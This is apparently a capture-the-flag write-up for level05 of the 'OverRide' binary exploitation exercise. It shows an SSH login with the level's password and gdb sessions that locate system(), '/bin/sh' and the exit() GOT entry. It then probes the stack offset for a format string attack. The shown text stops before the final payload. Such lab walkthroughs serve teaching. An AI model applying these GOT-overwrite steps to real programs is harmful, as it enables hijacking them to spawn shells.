# Format String Attack

```shell
┌──$ [~/42/2022/override]
└─>  ssh 192.168.56.101 -p 4242 -l level05
           ____                  ____  _     __   
          / __ \_   _____  _____/ __ \(_)___/ /__ 
         / / / / | / / _ \/ ___/ /_/ / / __  / _ \
        / /_/ /| |/ /  __/ /  / _, _/ / /_/ /  __/
        \____/ |___/\___/_/  /_/ |_/_/\__,_/\___/ 
                                          
                       Good luck & Have fun

   To start, ssh with level00/level00 on 192.168.56.101:4242
level05@192.168.56.101's password: 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
```
Only one `main()` function is defined in the executable.
It gets users input, decapitalize and print, following by exit with status 0.

The issue is that `printf()` is missuded which expose the application to the Format String Attack.
FSA allows to apply overwrite of GOT table where address of `exit()` is stored.

Determine addresses of `system()` and `"/bin/sh"` as well as where `exit()` is stored.
```
gdb-peda$ print system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
gdb-peda$
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f897ec ("/bin/sh")
gdb-peda$
gdb-peda$ x/i main+207
  0x8048513 <main+207>: call 0x8048370 <exit@plt>
gdb-peda$ disassemble 0x8048370
Dump of assembler code for function exit@plt:
  0x08048370 <+0>:  jmp  DWORD PTR ds:0x80497e0
  0x08048376 <+6>:  push 0x18
  0x0804837b <+11>: jmp  0x8048330
End of assembler dump.
gdb-peda$ x 0x80497e0
  0x80497e0 <exit@got.plt>: 0x08048376
```

Input recognizable characters to determine how far away input is layed on the stack. Note that due to XOR operation upercase character will be inverted, A(41) will be a(61).
```shell
level05@OverRide:~$ python -c 'print("AAAABBBB" + "%x "*11)' | ./level05
aaaabbbb00000064 f7fcfac0 f7ec3add ffffd6df ffffd6de 00000000 ffffffff ffffd764 f7fdb000 61616161 62626262
```
Input string starts with offset 10.
```
        [1]      [2]      [3]      [4]      [5]      [6]      [7]      [8]      [9]      [10]     [11]
aaaabbbb00000064 f7fcfac0 f7ec3add ffffd6df ffffd6de 00000000 ffffffff ffffd764 f7fdb000 61616161 62626262
```
